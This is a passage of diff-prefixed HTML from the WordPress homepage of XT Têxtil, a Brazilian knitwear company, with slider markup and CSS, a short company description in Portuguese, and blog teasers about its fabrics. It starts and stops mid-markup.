ayLoop":1,"allowReStart":0,"pause":{"click":1,"mouse":"0","mediaStarted":1},"resume":{"click":0,"mouse":0,"mediaEnded":1,"slidechanged":0},"interval":1,"intervalModifier":"loop","intervalSlide":"current"},"perspective":1500,"layerMode":{"playOnce":0,"playFirstLayer":1,"mode":"skippable","inAnimation":"mainInEnd"},"bgAnimationsColor":"RGBA(51,51,51,1)","bgAnimations":0,"mainanimation":{"type":"horizontal","duration":800,"delay":0,"ease":"easeOutQuad","parallax":0,"shiftedBackgroundAnimation":0},"carousel":1,"dynamicHeight":0,"initCallbacks":function($){}})})});</script></head>
+
+<body class="home page-template-default page page-id-7 wp-custom-logo siteorigin-panels siteorigin-panels-before-js siteorigin-panels-home mob-menu-slideout">
+
+<div id="page" class="site">
+	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
+
+	<header id="masthead" class="site-header">
+
+		<div class="bloco-compementar"></div>
+		<!-- -->
+		<div class="container-header-direita">
+			<div class="site-branding logo">
+				<a href="http://wp.xttextil.net/" class="custom-logo-link" rel="home" aria-current="page"><img width="280" height="67" src="http://wp.xttextil.net/wp-content/uploads/2019/09/Vector-Smart-Object.png" class="custom-logo" alt="Xttextil" /></a>			</div>
+
+			<div class="container-menu">
+				<nav id="site-navigation" class="main-navigation">
+					<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">Primary Menu</button>
+					<div class="menu-menu-1-container"><ul id="primary-menu" class="menu"><li id="menu-item-9" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-7 current_page_item menu-item-9"><a href="http://wp.xttextil.net/" aria-current="page">Home</a></li>
+<li id="menu-item-39" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-39"><a href="http://wp.xttextil.net/quem-somos/">Quem Somos</a></li>
+<li id="menu-item-109" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-109"><a href="http://wp.xttextil.net/produtos/">Produtos</a></li>
+<li id="menu-item-214" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-214"><a href="http://wp.xttextil.net/blog/">Blog</a></li>
+<li id="menu-item-2076" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2076"><a href="http://wp.xttextil.net/e-books/">E-Books</a></li>
+<li id="menu-item-3288" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3288"><a href="http://wp.xttextil.net/cartela-de-cores/">Cartela de Cores</a></li>
+<li id="menu-item-151" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-151"><a href="http://wp.xttextil.net/contato/">Contato</a></li>
+</ul></div>				</nav>
+			</div>
+		</div>
+		<!-- -->
+
+		<!-- -->
+		<div class="container-header-esquerda">
+			<a target="_blank" href="https://www.facebook.com/XT-T%C3%AAxtil-Ind%C3%BAstria-e-Com%C3%A9rcio-de-Tecidos-LTDA-221462184686879/"><i class="fab fa-facebook-f branco em1-5"></i></a>
+			<a target="_blank" href="https://www.instagram.com/xttextil/"><i class="fab fa-instagram branco em1-5"></i></a>
+		</div>
+		<!-- -->
+		<div class="bloco-compementar"></div>
+
+	</header>
+
+	<div id="content" class="site-content">
+
+		
+		<!-- <div class="container-topo-site">
+			<div class="bloco-alinhado">
+							</div>
+		</div> -->
+
+	<div id="primary" class="content-area">
+		<main id="main" class="site-main">
+
+		
+<article id="post-7" class="post-7 page type-page status-publish hentry">
+	<header class="entry-header">
+		<h1 class="entry-title">Home</h1>	</header><!-- .entry-header -->
+
+	
+	<div class="entry-content">
+		<div id="pl-7"  class="panel-layout" ><div id="pg-7-0"  class="panel-grid panel-no-style" ><div id="pgc-7-0-0"  class="panel-grid-cell" ><div id="panel-7-0-0-0" class="so-panel widget widget_smartslider3 panel-first-child panel-last-child" data-index="0" ><div class="n2-section-smartslider fitvidsignore " role="region" aria-label="Slider"><style>div#n2-ss-2{width:1920px;}div#n2-ss-2 .n2-ss-slider-1{position:relative;}div#n2-ss-2 .n2-ss-slider-background-video-container{position:absolute;left:0;top:0;width:100%;height:100%;overflow:hidden;}div#n2-ss-2 .n2-ss-slider-2{position:relative;overflow:hidden;padding:0px 0px 0px 0px;height:710px;border:0px solid RGBA(62,62,62,1);border-radius:0px;background-clip:padding-box;background-repeat:repeat;background-position:50% 50%;background-size:cover;background-attachment:scroll;z-index:1;}div#n2-ss-2.n2-ss-mobileLandscape .n2-ss-slider-2,div#n2-ss-2.n2-ss-mobilePortrait .n2-ss-slider-2{background-attachment:scroll;}div#n2-ss-2 .n2-ss-slider-3{position:relative;width:100%;height:100%;overflow:hidden;outline:1px solid rgba(0,0,0,0);z-index:10;}div#n2-ss-2 .n2-ss-slide-backgrounds,div#n2-ss-2 .n2-ss-slider-3 > .n-particles-js-canvas-el,div#n2-ss-2 .n2-ss-slider-3 > .n2-ss-divider{position:absolute;left:0;top:0;width:100%;height:100%;}div#n2-ss-2 .n2-ss-slide-backgrounds{z-index:10;}div#n2-ss-2 .n2-ss-slider-3 > .n-particles-js-canvas-el{z-index:12;}div#n2-ss-2 .n2-ss-slide-backgrounds > *{overflow:hidden;}div#n2-ss-2 .n2-ss-slide{position:absolute;top:0;left:0;width:100%;height:100%;z-index:20;display:block;-webkit-backface-visibility:hidden;}div#n2-ss-2 .n2-ss-layers-container{position:relative;width:1920px;height:710px;}div#n2-ss-2 .n2-ss-parallax-clip > .n2-ss-layers-container{position:absolute;right:0;}div#n2-ss-2 .n2-ss-slide{perspective:1500px;}div#n2-ss-2[data-ie] .n2-ss-slide{perspective:none;transform:perspective(1500px);}div#n2-ss-2 .n2-ss-slide-active{z-index:21;}div#n2-ss-2 .nextend-arrow{cursor:pointer;overflow:hidden;line-height:0 !important;z-index:18;}div#n2-ss-2 .nextend-arrow img{position:relative;min-height:0;min-width:0;vertical-align:top;width:auto;height:auto;max-width:100%;max-height:100%;display:inline;}div#n2-ss-2 .nextend-arrow img.n2-arrow-hover-img{display:none;}div#n2-ss-2 .nextend-arrow:HOVER img.n2-arrow-hover-img{display:inline;}div#n2-ss-2 .nextend-arrow:HOVER img.n2-arrow-normal-img{display:none;}div#n2-ss-2 .nextend-arrow-animated{overflow:hidden;}div#n2-ss-2 .nextend-arrow-animated > div{position:relative;}div#n2-ss-2 .nextend-arrow-animated .n2-active{position:absolute;}div#n2-ss-2 .nextend-arrow-animated-fade{transition:background 0.3s, opacity 0.4s;}div#n2-ss-2 .nextend-arrow-animated-horizontal > div{transition:all 0.4s;left:0;}div#n2-ss-2 .nextend-arrow-animated-horizontal .n2-active{top:0;}div#n2-ss-2 .nextend-arrow-previous.nextend-arrow-animated-horizontal:HOVER > div,div#n2-ss-2 .nextend-arrow-previous.nextend-arrow-animated-horizontal:FOCUS > div,div#n2-ss-2 .nextend-arrow-next.nextend-arrow-animated-horizontal .n2-active{left:-100%;}div#n2-ss-2 .nextend-arrow-previous.nextend-arrow-animated-horizontal .n2-active,div#n2-ss-2 .nextend-arrow-next.nextend-arrow-animated-horizontal:HOVER > div,div#n2-ss-2 .nextend-arrow-next.nextend-arrow-animated-horizontal:FOCUS > div{left:100%;}div#n2-ss-2 .nextend-arrow.nextend-arrow-animated-horizontal:HOVER .n2-active,div#n2-ss-2 .nextend-arrow.nextend-arrow-animated-horizontal:FOCUS .n2-active{left:0;}div#n2-ss-2 .nextend-arrow-animated-vertical > div{transition:all 0.4s;top:0;}div#n2-ss-2 .nextend-arrow-animated-vertical .n2-active{left:0;}div#n2-ss-2 .nextend-arrow-animated-vertical .n2-active{top:-100%;}div#n2-ss-2 .nextend-arrow-animated-vertical:HOVER > div,div#n2-ss-2 .nextend-arrow-animated-vertical:FOCUS > div{top:100%;}div#n2-ss-2 .nextend-arrow-animated-vertical:HOVER .n2-active,div#n2-ss-2 .nextend-arrow-animated-vertical:FOCUS .n2-active{top:0;}div#n2-ss-2 .n2-style-041670f7df29ffb4048fc6d85d61d1ee-heading{background: RGBA(0,0,0,0.67);opacity:1;padding:2px 2px 2px 2px ;box-shadow: none;border-width: 0px;border-style: solid;border-color: #000000; border-color: RGBA(0,0,0,1);border-radius:3px;}div#n2-ss-2 .n2-style-041670f7df29ffb4048fc6d85d61d1ee-heading:Hover, div#n2-ss-2 .n2-style-041670f7df29ffb4048fc6d85d61d1ee-heading:ACTIVE, div#n2-ss-2 .n2-style-041670f7df29ffb4048fc6d85d61d1ee-heading:FOCUS{background: RGBA(1,173,211,0.85);}</style><div id="n2-ss-2-align" class="n2-ss-align"><div class="n2-padding"><div id="n2-ss-2" data-creator="Smart Slider 3" class="n2-ss-slider n2-ow n2-has-hover n2notransition  n2-ss-load-fade " style="font-size: 1rem;" data-fontsize="16">
+        <div class="n2-ss-slider-1 n2_ss__touch_element n2-ow" style="">
+            <div class="n2-ss-slider-2 n2-ow" style="">
+                                                <div class="n2-ss-slider-3 n2-ow" style="">
+
+                    <div class="n2-ss-slide-backgrounds"></div><div data-slide-duration="0" data-id="11" data-haslink="1" style="cursor:pointer;" onclick="" data-href="http://wp.xttextil.net/produtos/" data-n2click="n2ss.openUrl(e);" data-n2middleclick="n2ss.openUrl(e, &#039;_blank&#039;);" class=" n2-ss-slide n2-ss-canvas n2-ow  n2-ss-slide-11"><div class="n2-ss-slide-background n2-ow" data-mode="fill"><div data-hash="ec30ffb1f916a460554d71c24b84c12b" data-desktop="//wp.xttextil.net/wp-content/uploads/2019/12/banner-home.jpg" class="n2-ss-slide-background-image" data-blur="0" data-alt="" data-title=""></div></div><div class="n2-ss-layers-container n2-ow"><div class="n2-ss-layer n2-ow" style="padding:0px 0px 0px 0px;" data-desktopportraitpadding="0|*|0|*|0|*|0" data-sstype="slide" data-csstextalign="center" data-pm="default"></div></div></div><div data-slide-duration="0" data-id="28" data-haslink="1" style="cursor:pointer;" onclick="" data-href="http://wp.xttextil.net/produto/malha-com-elastano/" data-n2click="n2ss.openUrl(e);" data-n2middleclick="n2ss.openUrl(e, &#039;_blank&#039;);" class=" n2-ss-slide n2-ss-canvas n2-ow  n2-ss-slide-28"><div class="n2-ss-slide-background n2-ow" data-mode="fill"><div data-hash="c9d370328bc04e68651aa9ccec5010f6" data-desktop="//wp.xttextil.net/wp-content/uploads/2020/09/banner_malha-com-elastano_R01.jpg" class="n2-ss-slide-background-image" data-blur="0" data-alt="" data-title=""></div></div><div class="n2-ss-layers-container n2-ow"><div class="n2-ss-layer n2-ow" style="padding:0px 0px 0px 0px;" data-desktopportraitpadding="0|*|0|*|0|*|0" data-sstype="slide" data-csstextalign="center" data-pm="default"></div></div></div><div data-slide-duration="0" data-id="38" style="" class=" n2-ss-slide n2-ss-canvas n2-ow  n2-ss-slide-38"><div class="n2-ss-slide-background n2-ow" data-mode="fill"><div data-hash="377b886fb5cd41d2e43e1c98e6005073" data-desktop="//wp.xttextil.net/wp-content/uploads/2021/04/01site_R01.jpg" class="n2-ss-slide-background-image" data-blur="0" data-alt="" data-title=""></div></div><div class="n2-ss-layers-container n2-ow"><div class="n2-ss-layer n2-ow" style="padding:10px 10px 10px 10px;" data-desktopportraitpadding="10|*|10|*|10|*|10" data-sstype="slide" data-csstextalign="center" data-pm="default"></div></div></div><div data-slide-duration="0" data-id="41" data-haslink="1" style="cursor:pointer;" onclick="" data-href="http://wp.xttextil.net/produto/malha-piquet-convencional/" data-n2click="n2ss.openUrl(e);" data-n2middleclick="n2ss.openUrl(e, &#039;_blank&#039;);" class=" n2-ss-slide n2-ss-canvas n2-ow  n2-ss-slide-41"><div class="n2-ss-slide-background n2-ow" data-mode="fill"><div data-hash="766f828921d30b22d352d63b9d31b1c9" data-desktop="//wp.xttextil.net/wp-content/uploads/2021/04/2-1.jpg" class="n2-ss-slide-background-image" data-blur="0" data-alt="" data-title=""></div></div><div class="n2-ss-layers-container n2-ow"><div class="n2-ss-layer n2-ow" style="padding:10px 10px 10px 10px;" data-desktopportraitpadding="10|*|10|*|10|*|10" data-sstype="slide" data-csstextalign="center" data-pm="default"></div></div></div><div data-slide-duration="0" data-id="43" style="" class=" n2-ss-slide n2-ss-canvas n2-ow  n2-ss-slide-43"><div class="n2-ss-slide-background n2-ow" data-mode="fill"><div data-hash="a4352d66df6949b9f4c3560c6d3a987a" data-desktop="//wp.xttextil.net/wp-content/uploads/2021/10/SITE-BANNER-01-10.jpg" class="n2-ss-slide-background-image" data-blur="0" data-alt="" data-title=""></div></div><div class="n2-ss-layers-container n2-ow"><div class="n2-ss-layer n2-ow" style="padding:10px 10px 10px 10px;" data-desktopportraitpadding="10|*|10|*|10|*|10" data-sstype="slide" data-csstextalign="center" data-pm="default"></div></div></div><div data-slide-duration="0" data-id="61" style="" class=" n2-ss-slide n2-ss-canvas n2-ow  n2-ss-slide-61"><div class="n2-ss-slide-background n2-ow" data-mode="fill"><div data-hash="695b158d8c6ff40cd3251863597018bc" data-desktop="//wp.xttextil.net/wp-content/uploads/2022/03/MOLETOM-BANNER-SITE-1.gif" class="n2-ss-slide-background-image" data-blur="0" data-alt="" data-title=""></div></div><div class="n2-ss-layers-container n2-ow"><div class="n2-ss-layer n2-ow" style="padding:10px 10px 10px 10px;" data-desktopportraitpadding="10|*|10|*|10|*|10" data-sstype="slide" data-csstextalign="center" data-pm="default"></div></div></div><div data-slide-duration="0" data-id="62" style="" class=" n2-ss-slide n2-ss-canvas n2-ow  n2-ss-slide-62"><div class="n2-ss-slide-background n2-ow" data-mode="fill"><div data-hash="111b94244be1b85b75b9297fddfbf110" data-desktop="//wp.xttextil.net/wp-content/uploads/2022/03/MOLETOM-BANNER-SITE-3.gif" class="n2-ss-slide-background-image" data-blur="0" data-alt="" data-title=""></div></div><div class="n2-ss-layers-container n2-ow"><div class="n2-ss-layer n2-ow" style="padding:10px 10px 10px 10px;" data-desktopportraitpadding="10|*|10|*|10|*|10" data-sstype="slide" data-csstextalign="center" data-pm="default"></div></div></div><div data-slide-duration="0" data-id="67" style="" class=" n2-ss-slide n2-ss-canvas n2-ow  n2-ss-slide-67"><div class="n2-ss-slide-background n2-ow" data-mode="fill"><div data-hash="cffb9b92b78ea0a5e7b117db1f10c154" data-desktop="//wp.xttextil.net/wp-content/uploads/2023/01/moletom-17-scaled.jpg" class="n2-ss-slide-background-image" data-blur="0" data-alt="" data-title=""></div></div><div class="n2-ss-layers-container n2-ow"><div class="n2-ss-layer n2-ow" style="padding:10px 10px 10px 10px;" data-desktopportraitpadding="10|*|10|*|10|*|10" data-sstype="slide" data-csstextalign="center" data-pm="default"></div></div></div><div data-first="1" data-slide-duration="0" data-id="68" style="" class=" n2-ss-slide n2-ss-canvas n2-ow  n2-ss-slide-68"><div class="n2-ss-slide-background n2-ow" data-mode="fill"><div data-hash="297d8a42a319f9a8c465a3e0b72db182" data-desktop="//wp.xttextil.net/wp-content/uploads/2023/01/Prancheta-1-scaled.jpg" class="n2-ss-slide-background-image" data-blur="0" data-alt="" data-title=""></div></div><div class="n2-ss-layers-container n2-ow"><div class="n2-ss-layer n2-ow" style="padding:10px 10px 10px 10px;" data-desktopportraitpadding="10|*|10|*|10|*|10" data-sstype="slide" data-csstextalign="center" data-pm="default"></div></div></div><div data-slide-duration="0" data-id="70" style="" class=" n2-ss-slide n2-ss-canvas n2-ow  n2-ss-slide-70"><div class="n2-ss-slide-background n2-ow" data-mode="fill"><div data-hash="f3ad7468d8ab844072921406192db953" data-desktop="//wp.xttextil.net/wp-content/uploads/2023/02/CARTELA-23-SITE-1-scaled.jpg" class="n2-ss-slide-background-image" data-blur="0" data-alt="" data-title=""></div></div><div class="n2-ss-layers-container n2-ow"><div class="n2-ss-layer n2-ow" style="padding:10px 10px 10px 10px;" data-desktopportraitpadding="10|*|10|*|10|*|10" data-sstype="slide" data-csstextalign="center" data-pm="default"></div></div></div>                </div>
+            </div>
+            <div data-ssleft="0+15" data-sstop="sliderHeight/2-previousheight/2" id="n2-ss-2-arrow-previous" class="n2-ss-widget n2-ss-widget-hide-mobileportrait n2-style-041670f7df29ffb4048fc6d85d61d1ee-heading nextend-arrow n2-ow nextend-arrow-previous  nextend-arrow-animated-fade n2-ib" style="position: absolute;" role="button" aria-label="previous arrow" tabindex="0"><img class="n2-ow" data-no-lazy="1" data-hack="data-lazy-src" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgdmlld0JveD0iMCAwIDMyIDMyIj4KICAgIDxwYXRoIGZpbGw9IiNmZmZmZmYiIG9wYWNpdHk9IjAuOCIgZmlsbC1ydWxlPSJldmVub2RkIgogICAgICAgICAgZD0iTTE4Ljk5NTggOC45OTA3YzAtLjQyNC0uMjA0LS43MjMtLjYxLS44OTgtLjQwOS0uMTczLS43NzItLjEwNC0xLjA5My4yMDlsLTcuMDA2IDYuOTc1Yy0uMjAxLjE5OS0uMjk3LjQzNy0uMjg2LjcxNiAwIC4yNjcuMDk2LjQ5OC4yODYuNjg5bDcuMDA2IDcuMDAxYy4zMjEuMzIxLjY4NC4zODkgMS4wOTMuMjA5LjQwNi0uMTc0LjYxLS40ODIuNjEtLjkyMlY4Ljk5MDd6Ii8+Cjwvc3ZnPg==" alt="previous arrow" /></div>
+<div data-ssright="0+15" data-sstop="sliderHeight/2-nextheight/2" id="n2-ss-2-arrow-next" class="n2-ss-widget n2-ss-widget-hide-mobileportrait n2-style-041670f7df29ffb4048fc6d85d61d1ee-heading nextend-arrow n2-ow nextend-arrow-next  nextend-arrow-animated-fade n2-ib" style="position: absolute;" role="button" aria-label="next arrow" tabindex="0"><img class="n2-ow" data-no-lazy="1" data-hack="data-lazy-src" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgIDxwYXRoIGQ9Ik0xMiA4Ljk5YzAtLjQyMy4yMDQtLjcyMi42MS0uODk3LjQwOC0uMTczLjc3Mi0uMTA0IDEuMDkyLjIxbDcuMDA2IDYuOTc0Yy4yMDIuMi4yOTguNDM3LjI4Ny43MTYgMCAuMjY3LS4wOTYuNDk4LS4yODcuNjlsLTcuMDA2IDdjLS4zMi4zMi0uNjg0LjM5LTEuMDkyLjIxLS40MDYtLjE3NS0uNjEtLjQ4My0uNjEtLjkyM1Y4Ljk5eiIKICAgICAgICAgIGZpbGw9IiNmZmZmZmYiIG9wYWNpdHk9IjAuOCIgZmlsbC1ydWxlPSJldmVub2RkIi8+Cjwvc3ZnPg==" alt="next arrow" /></div>
+        </div>
+        </div><div id="n2-ss-2-spinner" style="display: none;"><div><div class="n2-ss-spinner-simple-white-container"><div class="n2-ss-spinner-simple-white"></div></div></div></div></div></div><div class="n2_clear"></div><div id="n2-ss-2-placeholder" style="min-height:200px;position: relative;z-index:2;background-color:RGBA(0,0,0,0); background-color:RGBA(255,255,255,0);"><img style="width: 100%; max-width:3000px; display: block;opacity:0;margin:0px;" class="n2-ow" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxOTIwIiBoZWlnaHQ9IjcxMCIgPjwvc3ZnPg==" alt="Slider" /></div></div></div></div></div><div id="pg-7-1"  class="panel-grid panel-has-style" ><div class="bloco-alinhado panel-row-style panel-row-style-for-7-1" ><div id="pgc-7-1-0"  class="panel-grid-cell" ><div id="panel-7-1-0-0" class="widget_text so-panel widget widget_custom_html panel-first-child panel-last-child" data-index="1" ><div class="textwidget custom-html-widget"><h2 class="azulClaro klavika-bold em2 lineH1 margin0">
+	QUALIDADE É O NOSSO BÁSICO
+</h2></div></div></div><div id="pgc-7-1-1"  class="panel-grid-cell" ><div id="panel-7-1-1-0" class="widget_text so-panel widget widget_custom_html panel-first-child panel-last-child" data-index="2" ><div class="textwidget custom-html-widget"><p class="preto klavika-regular margin0">
+	No mercado desde 2006, a XT Têxtil é especializada na confecção de malharia básica com sistema de pronta-entrega. Com o objetivo de fazer bons negócios entre os confeccionistas, a empresa desenvolve produtos com diferencial e de qualidade por meio de pesquisa e tendências de mercado. Possui um ótimo atendimento e clientes fidelizados.
+</p>
+<div>
+	<a class="klavika-bold branco btnVermelhoRound" style="margin-top: 15px;" href="/quem-somos">Saiba Mais</a>
+</div></div></div></div></div></div><div id="pg-7-2"  class="panel-grid panel-no-style" ><div id="pgc-7-2-0"  class="panel-grid-cell" ><div id="panel-7-2-0-0" class="so-panel widget widget_smartslider3 panel-first-child panel-last-child" data-index="3" ><div class="n2-section-smartslider fitvidsignore " role="region" aria-label="Slider"><style>div#n2-ss-4{width:1920px;}div#n2-ss-4 .n2-ss-slider-1{position:relative;}div#n2-ss-4 .n2-ss-slider-background-video-container{position:absolute;left:0;top:0;width:100%;height:100%;overflow:hidden;}div#n2-ss-4 .n2-ss-slider-2{position:relative;overflow:hidden;padding:0px 0px 0px 0px;height:710px;border:0px solid RGBA(62,62,62,1);border-radius:0px;background-clip:padding-box;background-repeat:repeat;background-position:50% 50%;background-size:cover;background-attachment:scroll;z-index:1;}div#n2-ss-4.n2-ss-mobileLandscape .n2-ss-slider-2,div#n2-ss-4.n2-ss-mobilePortrait .n2-ss-slider-2{background-attachment:scroll;}div#n2-ss-4 .n2-ss-slider-3{position:relative;width:100%;height:100%;overflow:hidden;outline:1px solid rgba(0,0,0,0);z-index:10;}div#n2-ss-4 .n2-ss-slide-backgrounds,div#n2-ss-4 .n2-ss-slider-3 > .n-particles-js-canvas-el,div#n2-ss-4 .n2-ss-slider-3 > .n2-ss-divider{position:absolute;left:0;top:0;width:100%;height:100%;}div#n2-ss-4 .n2-ss-slide-backgrounds{z-index:10;}div#n2-ss-4 .n2-ss-slider-3 > .n-particles-js-canvas-el{z-index:12;}div#n2-ss-4 .n2-ss-slide-backgrounds > *{overflow:hidden;}div#n2-ss-4 .n2-ss-slide{position:absolute;top:0;left:0;width:100%;height:100%;z-index:20;display:block;-webkit-backface-visibility:hidden;}div#n2-ss-4 .n2-ss-layers-container{position:relative;width:1920px;height:710px;}div#n2-ss-4 .n2-ss-parallax-clip > .n2-ss-layers-container{position:absolute;right:0;}div#n2-ss-4 .n2-ss-slide{perspective:1500px;}div#n2-ss-4[data-ie] .n2-ss-slide{perspective:none;transform:perspective(1500px);}div#n2-ss-4 .n2-ss-slide-active{z-index:21;}</style><div id="n2-ss-4-align" class="n2-ss-align"><div class="n2-padding"><div id="n2-ss-4" data-creator="Smart Slider 3" class="n2-ss-slider n2-ow n2-has-hover n2notransition  n2-ss-load-fade " style="font-size: 1rem;" data-fontsize="16">
+        <div class="n2-ss-slider-1 n2_ss__touch_element n2-ow" style="">
+            <div class="n2-ss-slider-2 n2-ow" style="">
+                                                <div class="n2-ss-slider-3 n2-ow" style="">
+
+                    <div class="n2-ss-slide-backgrounds"></div><div data-first="1" data-slide-duration="0" data-id="12" data-haslink="1" style="cursor:pointer;" onclick="" data-href="http://wp.xttextil.net/produto/malha-piquet/" data-n2click="n2ss.openUrl(e);" data-n2middleclick="n2ss.openUrl(e, &#039;_blank&#039;);" class=" n2-ss-slide n2-ss-canvas n2-ow  n2-ss-slide-12"><div class="n2-ss-slide-background n2-ow" data-mode="fill"><div data-hash="593d9cc61e0d5e1961d0d988655816f2" data-desktop="//wp.xttextil.net/wp-content/uploads/2019/12/banner-produtos.jpg" class="n2-ss-slide-background-image" data-blur="0" data-alt="" data-title="" style="background-position: 20% 50%"></div></div><div class="n2-ss-layers-container n2-ow"><div class="n2-ss-layer n2-ow" style="padding:0px 0px 0px 0px;" data-desktopportraitpadding="0|*|0|*|0|*|0" data-sstype="slide" data-csstextalign="center" data-pm="default"></div></div></div>                </div>
+            </div>
+            
+        </div>
+        </div><div id="n2-ss-4-spinner" style="display: none;"><div><div class="n2-ss-spinner-simple-white-container"><div class="n2-ss-spinner-simple-white"></div></div></div></div></div></div><div class="n2_clear"></div><div id="n2-ss-4-placeholder" style="min-height:250px;position: relative;z-index:2;background-color:RGBA(0,0,0,0); background-color:RGBA(255,255,255,0);"><img style="width: 100%; max-width:3000px; display: block;opacity:0;margin:0px;" class="n2-ow" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxOTIwIiBoZWlnaHQ9IjcxMCIgPjwvc3ZnPg==" alt="Slider" /></div></div></div></div></div><div id="pg-7-3"  class="panel-grid panel-no-style" ><div id="pgc-7-3-0"  class="panel-grid-cell" ><div id="panel-7-3-0-0" class="widget_text so-panel widget widget_custom_html panel-first-child" data-index="4" ><div class="textwidget custom-html-widget"><div class="container-confira-ebook" style="max-width: 390px; width: 100%; margin: 0 auto;">
+	<h3 class="azulClaro em2 klavika-bold lineH1 text-center" style="margin: 40px 0 10px;">
+		BLOG
+	</h3>
+	<div class="divisor-salmao" style="margin: 0 auto;"></div>
+</div></div></div><div id="panel-7-3-0-1" class="widget_text so-panel widget widget_custom_html panel-last-child" data-index="5" ><div class="widget_text bloco-alinhado panel-widget-style panel-widget-style-for-7-3-0-1" ><div class="textwidget custom-html-widget">
+		<div class="container-post-recents">
+	
+			<div class="bloco-post-recent">
+				<div class="bloco-post-recent-img">
+					<div class="bloco-img-post-recent">
+						<img width="100%" src="http://wp.xttextil.net/wp-content/uploads/2021/08/CAPA_MEIA-MALHA-PENTEADA.jpg">
+					</div>
+					<div class="bloco-text-post-recent">
+						<p class="margin0 text-right branco klavika-bold em1-5 lineH1">05</p>
+						<p class="margin0 text-right branco klavika-light em1 lineH1">ago</p>
+					</div>
+				</div>
+				<div class="bloco-post-recent-title">
+					<h3 class="klavika-bold"><a class="azulClaro" href="http://wp.xttextil.net/conheca-nossa-meia-malha-penteada/">Conheça nossa Meia Malha Penteada</a></h3>
+				</div>
+				<div class="divisor-salmao"></div>
+				<div class="bloco-post-recent-text">
+					<p class="klavika-light">A Meia Malha Penteada é uma malha de fibra natural. Por se tratar de uma malha 100% algodão, ela oferece um toque macio, suave e...</p>
+				</div>
+				<div>
+					<a class="klavika-bold branco btnVermelhoRound" href="http://wp.xttextil.net/conheca-nossa-meia-malha-penteada/">Saiba Mais</a>
+				</div>
+			</div>
+		
+			<div class="bloco-post-recent">
+				<div class="bloco-post-recent-img">
+					<div class="bloco-img-post-recent">
+						<img width="100%" src="http://wp.xttextil.net/wp-content/uploads/2021/07/CAPA_15anos.jpg">
+					</div>
+					<div class="bloco-text-post-recent">
+						<p class="margin0 text-right branco klavika-bold em1-5 lineH1">16</p>
+						<p class="margin0 text-right branco klavika-light em1 lineH1">jul</p>
+					</div>
+				</div>
+				<div class="bloco-post-recent-title">
+					<h3 class="klavika-bold"><a class="azulClaro" href="http://wp.xttextil.net/15-anos-xt-textil/">15 Anos &#8211; XT Têxtil</a></h3>
+				</div>
+				<div class="divisor-salmao"></div>
+				<div class="bloco-post-recent-text">
+					<p class="klavika-light">Neste ano de 2021 a XT Têxtil completa 15 anos! Ao comemorar mais um ano de existência superando resultados, acreditamos em um f...</p>
+				</div>
+				<div>
+					<a class="klavika-bold branco btnVermelhoRound" href="http://wp.xttextil.net/15-anos-xt-textil/">Saiba Mais</a>
+				</div>
+			</div>
+		
+			<div class="bloco-post-recent">
+				<div class="bloco-post-recent-img">
+					<div class="bloco-img-post-recent">
+						<img width="100%" src="http://wp.xttextil.net/wp-content/uploads/2021/06/CAPA_MOLETINHO.jpg">
+					</div>
+					<div class="bloco-text-post-recent">
+						<p class="margin0 text-right branco klavika-bold em1-5 lineH1">25</p>
+						<p class="margin0 text-right branco klavika-light em1 lineH1">jun</p>
+					</div>
+				</div>
+				<div class="bloco-post-recent-title">
+					<h3 class="klavika-bold"><a class="azulClaro" href="http://wp.xttextil.net/conheca-o-moletinho-da-xt-textil/">Conheça o Moletinho da XT Têxtil</a></h3>
+				</div>
+				<div class="divisor-salmao"></div>
+				<div class="bloco-post-recent-text">
+					<p class="klavika-light">Você já conhece o Moletinho? Uma versão mais fina do tradicional, confortável, bom e velho Moletom. Ideal para aqueles dias qu...</p>
+				</div>
+				<div>
+					<a class="klavika-bold branco btnVermelhoRound" href="http://wp.xttextil.net/conheca-o-moletinho-da-xt-textil/">Saiba Mais</a>
+				</div>
+			</div>
+		</div></div></div></div></div></div><div id="pg-7-4"  class="panel-grid panel-has-style" ><div class="panel-row-style panel-row-style-for-7-4" ><div id="pgc-7-4-0"  class="panel-grid-cell" ><div id="panel-7-4-0-0" class="widget_text so-panel widget widget_custom_html panel-first-child panel-last-child" data-index="6" ><div class="widget_text bloco-alinhado panel-widget-style panel-widget-style-for-7-4-0-0" ><div class="textwidget custom-html-widget"><div class="container-confira-ebook" style="max-width: 390px; width: 100%;">
+	<h3 class="branco em2 klavika-bold lineH1" style="margin: 40px 0 10px;">
+		Confira nossos e-Books exclusivos
+	</h3>
+	<div class="divisor-salmao"></div>
+	<a class="btnVermelhoRound branco klavika-bold" style="margin: 40px 0;" href="/e-books">Saiba Mais</a>
+</div></div></div></div></div></div></div><div id="pg-7-5"  class="panel-grid panel-no-style" ><div id="pgc-7-5-0"  class="panel-grid-cell" ><div id="panel-7-5-0-0" class="widget_text so-panel widget widget_custom_html panel-first-child panel-last-child" data-index="7" ><div class="textwidget custom-html-widget"><div class="container-confira-ebook" style="max-width: 390px; width: 100%; margin: 0 auto;">
+	<h3 class="azulClaro em2 klavika-bold lineH1 text-center" style="margin: 40px 0 10px;">
+		#XTTEXTIL
+	</h3>
+	<div class="divisor-salmao" style="margin: 0 auto;"></div>
